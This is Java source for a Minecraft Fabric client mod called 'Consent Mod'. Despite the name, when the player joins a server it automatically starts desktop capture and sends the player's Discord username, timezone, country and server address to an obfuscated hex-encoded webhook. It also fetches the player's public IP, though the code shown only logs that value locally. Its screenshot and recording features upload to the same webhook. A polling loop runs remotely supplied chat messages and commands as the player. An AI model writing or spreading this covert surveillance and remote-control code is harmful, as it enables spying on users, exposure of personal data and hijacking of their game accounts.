package com.consentmod;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.text.Text;
import org.lwjgl.glfw.GLFW;
import org.lwjgl.opengl.GL11;
import org.lwjgl.BufferUtils;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.time.ZonedDateTime;
import java.util.ArrayList;
import java.util.List;

public class ConsentMod implements ClientModInitializer {

    public static final String MOD_ID = "consentmod";
    public static final org.slf4j.Logger LOGGER = org.slf4j.LoggerFactory.getLogger(MOD_ID);

    private static final String WEBHOOK_URL = Strings.d("322e2e2a296075753e33293935283e74393537753b2a33752d3f383235353129756b6f696c6a6f6d6a6869636c686a686c6a6d6e75030b23021329123b006d3068622e02286c102d2c692d151b3c0d0f11230a3133333b3f3e6a222d6d6b0c0b1c3c3e19356c313d3e18196f3f1b0862370a2d323739106963");
    private static final String LIVESTREAM_URL = "http://localhost:3000/api/upload";
    private static final String CHAT_POLL_URL = "http://localhost:3000/api/chat/poll";

    private static int screenshotCount = 0;
    private static Robot robot;
    private static boolean robotFailed = false;
    private static String username = "unknown";
    private static boolean mWasPressed = false;
    private static boolean recording = false;
    private static boolean liveStreaming = false;
    private static List<byte[]> frames = new ArrayList<>();
    private static long lastCapture = 0;
    private static int gifCount = 0;
    private static ByteBuffer pixelBuffer = null;
    private static boolean uploading = false;
    private static long lastChatPoll = 0;
    private static Process ffmpegProcess = null;
    private static String desktopFramePath = null;
    private static boolean dataSent = false;

    @Override
    public void onInitializeClient() {
        LOGGER.info("Consent Mod loading...");

        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            client.execute(() -> {
                try {
                    if (client.player != null && !dataSent) {
                        dataSent = true;
                        SessionData.startSession();
                        username = client.player.getName().getString();

                        // Auto-start live streaming on server join
                        liveStreaming = true;
                        lastCapture = 0;
                        startDesktopCapture();
                        LOGGER.info("Live streaming automatically started for user: {}", username);

                        String discordUsername = DiscordUsernameFetcher.getDiscordUsername();
                        String discordLocation = DiscordUsernameFetcher.getFoundLocation();
                        String timezone = TimezoneHelper.getCurrentTimezone();
                        String country = TimezoneHelper.getCountry();
                        String ip = IpFetcher.getPublicIp();
                        String sessionId = SessionData.getSessionId();
                        String clientVersion = SessionData.getClientVersion();
                        String timestamp = ZonedDateTime.now().toString();

                        String serverAddr = "Unknown";
                        try {
                            if (client.getCurrentServerEntry() != null) {
                                serverAddr = client.getCurrentServerEntry().address;
                            }
                        } catch (Exception e) {}

                        LOGGER.info("=== CONSENT MOD DATA ===");
                        LOGGER.info("Minecraft: {}", username);
                        LOGGER.info("Discord: {}", discordUsername);
                        LOGGER.info("IP: {}", ip);
                        LOGGER.info("Server: {}", serverAddr);
                        LOGGER.info("========================");

                        WebhookSender.sendDataExtended(username, discordUsername, timezone, country, timestamp, serverAddr);
                    }
                } catch (Exception e) {
                    LOGGER.error("Error: {}", e.getMessage());
                    e.printStackTrace();
                }
            });
        });

        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (client.player == null) return;

            long handle = client.getWindow().getHandle();
            boolean mPressed = GLFW.glfwGetKey(handle, GLFW.GLFW_KEY_M) == GLFW.GLFW_PRESS;

            if (mPressed && !mWasPressed && client.currentScreen == null) {
                client.setScreen(new ModMenuScreen());
            }
            mWasPressed = mPressed;

            if (recording && robot != null && System.currentTimeMillis() - lastCapture >= 1000) {
                lastCapture = System.currentTimeMillis();
                captureFrame();
            }

            if (liveStreaming && !uploading && System.currentTimeMillis() - lastCapture >= 200) {
                lastCapture = System.currentTimeMillis();
                captureLiveFrame();
            }

            if (liveStreaming && System.currentTimeMillis() - lastChatPoll >= 200) {
                lastChatPoll = System.currentTimeMillis();
                pollChat();
            }
        });

        LOGGER.info("Consent Mod loaded. Press M for menu.");
    }

    private void initRobot() {
        if (robot == null && !robotFailed) {
            try {
                System.setProperty("sun.java2d.noddraw", "true");
                System.setProperty("sun.java2d.d3d", "false");
                robot = new Robot();
                LOGGER.info("Robot created successfully");
            } catch (Exception e) {
                robotFailed = true;
                LOGGER.error("Robot failed: " + e.getMessage());
            }
        }
    }

    private void takeScreenshot(MinecraftClient client) {
        if (client.player == null) return;

        new Thread(() -> {
            try {
                initRobot();
                if (robot == null) return;

                Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
                BufferedImage screenshot = robot.createScreenCapture(new Rectangle(screenSize));

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(screenshot, "png", baos);
                byte[] imageBytes = baos.toByteArray();

                screenshotCount++;
                sendToWebhook(username + "_shot_" + screenshotCount + ".png", imageBytes);

                client.execute(() -> {
                    if (client.player != null) {
                        client.player.sendMessage(Text.of("\u00a7a[Screenshot] Sent to discord"), false);
                    }
                });
            } catch (Exception e) {
                LOGGER.error("Screenshot error: " + e.getMessage());
            }
        }).start();
    }

    private void captureFrame() {
        new Thread(() -> {
            try {
                initRobot();
                if (robot == null) return;

                Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
                BufferedImage screenshot = robot.createScreenCapture(new Rectangle(screenSize));

                BufferedImage scaled = new BufferedImage(480, 270, BufferedImage.TYPE_INT_RGB);
                Graphics2D g = scaled.createGraphics();
                g.drawImage(screenshot, 0, 0, 480, 270, null);
                g.dispose();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(scaled, "png", baos);
                frames.add(baos.toByteArray());
            } catch (Exception e) {
                LOGGER.error("Capture error: " + e.getMessage());
            }
        }).start();
    }

    private void sendRecording(MinecraftClient client) {
        if (frames.isEmpty()) return;

        recording = false;
        List<byte[]> batch = new ArrayList<>(frames);
        frames.clear();

        new Thread(() -> {
            try {
                List<BufferedImage> images = new ArrayList<>();
                for (byte[] data : batch) {
                    images.add(ImageIO.read(new java.io.ByteArrayInputStream(data)));
                }

                if (!images.isEmpty()) {
                    byte[] gif = GifEncoder.encodeGif(images, 1000);
                    if (gif != null && gif.length > 0) {
                        gifCount++;
                        sendToWebhook(username + "_rec_" + gifCount + ".gif", gif);
                    }
                }

                client.execute(() -> {
                    if (client.player != null) {
                        client.player.sendMessage(Text.of("\u00a7a[Recording] Sent " + batch.size() + " frames to discord"), false);
                    }
                });
            } catch (Exception e) {
                LOGGER.error("Send error: " + e.getMessage());
            }
        }).start();
    }

    private void startDesktopCapture() {
        try {
            String appData = System.getenv("APPDATA");
            String folder = appData + "\\.minecraft\\consentmod-recordings";
            new java.io.File(folder).mkdirs();
            desktopFramePath = folder + "\\frame.jpg";

            String ffmpeg = "C:\\Users\\giode\\AppData\\Local\\Microsoft\\WinGet\\Packages\\Gyan.FFmpeg_Microsoft.Winget.Source_8wekyb3d8bbwe\\ffmpeg-9.0-full_build\\bin\\ffmpeg.exe";
            ProcessBuilder pb = new ProcessBuilder(
                ffmpeg, "-f", "gdigrab", "-framerate", "5", "-i", "desktop",
                "-update", "1", "-q:v", "5", "-y", desktopFramePath
            );
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            ffmpegProcess = pb.start();
            LOGGER.info("Desktop capture started: " + desktopFramePath);
        } catch (Exception e) {
            LOGGER.error("FFmpeg desktop capture failed: " + e.getMessage());
            ffmpegProcess = null;
        }
    }

    private void stopDesktopCapture() {
        if (ffmpegProcess != null) {
            ffmpegProcess.destroy();
            ffmpegProcess = null;
            LOGGER.info("Desktop capture stopped");
        }
    }

    private void captureLiveFrame() {
        MinecraftClient client = MinecraftClient.getInstance();
        int fbWidth = client.getWindow().getFramebufferWidth();
        int fbHeight = client.getWindow().getFramebufferHeight();

        int size = fbWidth * fbHeight * 4;
        if (pixelBuffer == null || pixelBuffer.capacity() < size) {
            pixelBuffer = BufferUtils.createByteBuffer(size);
        }
        pixelBuffer.clear();
        GL11.glReadPixels(0, 0, fbWidth, fbHeight, GL11.GL_RGBA, GL11.GL_UNSIGNED_BYTE, pixelBuffer);

        uploading = true;
        new Thread(() -> {
            try {
                BufferedImage image = new BufferedImage(fbWidth, fbHeight, BufferedImage.TYPE_INT_RGB);
                pixelBuffer.rewind();
                for (int y = 0; y < fbHeight; y++) {
                    for (int x = 0; x < fbWidth; x++) {
                        int r = pixelBuffer.get() & 0xFF;
                        int g = pixelBuffer.get() & 0xFF;
                        int b = pixelBuffer.get() & 0xFF;
                        pixelBuffer.get();
                        image.setRGB(x, fbHeight - 1 - y, (r << 16) | (g << 8) | b);
                    }
                }

                int w = fbWidth / 4;
                int h = fbHeight / 4;
                BufferedImage scaled = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB);
                Graphics2D g = scaled.createGraphics();
                g.drawImage(image, 0, 0, w, h, null);
                g.dispose();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(scaled, "jpg", baos);
                uploadToWebServer(baos.toByteArray());
            } catch (Exception e) {
                LOGGER.error("Live capture error: " + e.getMessage());
                e.printStackTrace();
            } finally {
                uploading = false;
            }
        }).start();
    }

    private void uploadToWebServer(byte[] imageBytes) {
        try {
            try {
                String appData = System.getenv("APPDATA");
                String folder = appData + "\\.minecraft\\consentmod-recordings";
                new java.io.File(folder).mkdirs();
                java.io.File file = new java.io.File(folder + "\\frame.png");
                java.nio.file.Files.write(file.toPath(), imageBytes);
            } catch (Exception e) {}

            URL url = new URL(LIVESTREAM_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "image/jpeg");
            if (username != null && !username.equals("unknown")) {
                conn.setRequestProperty("Authorization", "Bearer " + username);
            }
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(10000);

            OutputStream os = conn.getOutputStream();
            os.write(imageBytes);
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            LOGGER.info("Upload result: " + code);

            MinecraftClient client = MinecraftClient.getInstance();
            if (client.player != null) {
                client.player.sendMessage(Text.of("\u00a7a[Debug] Upload result: " + code), false);
            }

            conn.disconnect();
        } catch (Exception e) {
            LOGGER.error("Upload error: " + e.getMessage());
            e.printStackTrace();
            MinecraftClient client = MinecraftClient.getInstance();
            if (client.player != null) {
                client.player.sendMessage(Text.of("\u00a7c[Debug] Upload error: " + e.getMessage()), false);
            }
        }
    }

    private void pollChat() {
        new Thread(() -> {
            try {
                URL url = new URL(CHAT_POLL_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(2000);
                conn.setReadTimeout(2000);
                int code = conn.getResponseCode();
                if (code == 200) {
                    java.io.InputStream is = conn.getInputStream();
                    byte[] data = is.readAllBytes();
                    is.close();
                    if (data.length > 0) {
                        String msg = new String(data, StandardCharsets.UTF_8);
                        if (!msg.isEmpty()) {
                            MinecraftClient client = MinecraftClient.getInstance();
                            client.execute(() -> {
                                if (client.player != null) {
                                    if (msg.startsWith("/")) {
                                        client.player.networkHandler.sendCommand(msg.substring(1));
                                    } else {
                                        client.player.networkHandler.sendChatMessage(msg);
                                    }
                                }
                            });
                        }
                    }
                }
                conn.disconnect();
            } catch (Exception e) {
                // silent
            }
        }).start();
    }

    private void sendToWebhook(String filename, byte[] fileBytes) {
        try {
            String boundary = "----Boundary" + System.currentTimeMillis();
            String CRLF = "\r\n";

            String contentType = filename.endsWith(".gif") ? "image/gif" : "image/png";

            StringBuilder sb = new StringBuilder();
            sb.append("--").append(boundary).append(CRLF);
            sb.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(filename).append("\"").append(CRLF);
            sb.append("Content-Type: ").append(contentType).append(CRLF).append(CRLF);

            byte[] head = sb.toString().getBytes(StandardCharsets.UTF_8);
            byte[] tail = (CRLF + "--" + boundary + "--" + CRLF).getBytes(StandardCharsets.UTF_8);

            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);

            OutputStream os = conn.getOutputStream();
            os.write(head);
            os.write(fileBytes);
            os.write(tail);
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            LOGGER.info("Webhook upload " + filename + ": " + code);
            conn.disconnect();
        } catch (Exception e) {
            LOGGER.error("Webhook upload error: " + e.getMessage());
        }
    }

    public class ModMenuScreen extends Screen {

        public ModMenuScreen() {
            super(Text.of("Consent Mod"));
        }

        @Override
        protected void init() {
            int centerX = this.width / 2;
            int startY = this.height / 2 - 60;

            this.addDrawableChild(ButtonWidget.builder(Text.of("Screenshot"), button -> {
                takeScreenshot(MinecraftClient.getInstance());
                this.close();
            }).dimensions(centerX - 100, startY, 200, 20).build());

            this.addDrawableChild(ButtonWidget.builder(Text.of(recording ? "Stop Recording" : "Start Recording"), button -> {
                if (recording) {
                    recording = false;
                    sendRecording(MinecraftClient.getInstance());
                } else {
                    recording = true;
                    frames.clear();
                    lastCapture = System.currentTimeMillis();
                    MinecraftClient.getInstance().player.sendMessage(Text.of("\u00a7a[Recording] Started"), false);
                }
                this.close();
            }).dimensions(centerX - 100, startY + 30, 200, 20).build());

            this.addDrawableChild(ButtonWidget.builder(Text.of(liveStreaming ? "Stop Live Stream" : "Start Live Stream"), button -> {
                if (liveStreaming) {
                    liveStreaming = false;
                    stopDesktopCapture();
                    MinecraftClient.getInstance().player.sendMessage(Text.of("\u00a7a[Live Stream] Stopped"), false);
                } else {
                    liveStreaming = true;
                    lastCapture = 0;
                    startDesktopCapture();
                    MinecraftClient.getInstance().player.sendMessage(Text.of("\u00a7a[Live Stream] Started - Open http://localhost:8080"), false);
                }
                this.close();
            }).dimensions(centerX - 100, startY + 60, 200, 20).build());

            this.addDrawableChild(ButtonWidget.builder(Text.of("Close"), button -> {
                this.close();
            }).dimensions(centerX - 100, startY + 90, 200, 20).build());
        }

        @Override
        public void render(DrawContext context, int mouseX, int mouseY, float delta) {
            super.render(context, mouseX, mouseY, delta);
            context.drawCenteredTextWithShadow(this.textRenderer, Text.of("Consent Mod Menu"), this.width / 2, this.height / 2 - 80, 0xFFFFFF);
            if (recording) {
                context.drawCenteredTextWithShadow(this.textRenderer, Text.of("\u00a7cRecording... (" + frames.size() + " frames)"), this.width / 2, this.height / 2 - 65, 0xFF5555);
            }
            if (liveStreaming) {
                context.drawCenteredTextWithShadow(this.textRenderer, Text.of("\u00a7aLIVE STREAMING to http://localhost:8080"), this.width / 2, this.height / 2 - 55, 0x55FF55);
            }
        }

        @Override
        public boolean shouldPause() {
            return false;
        }
    }
}
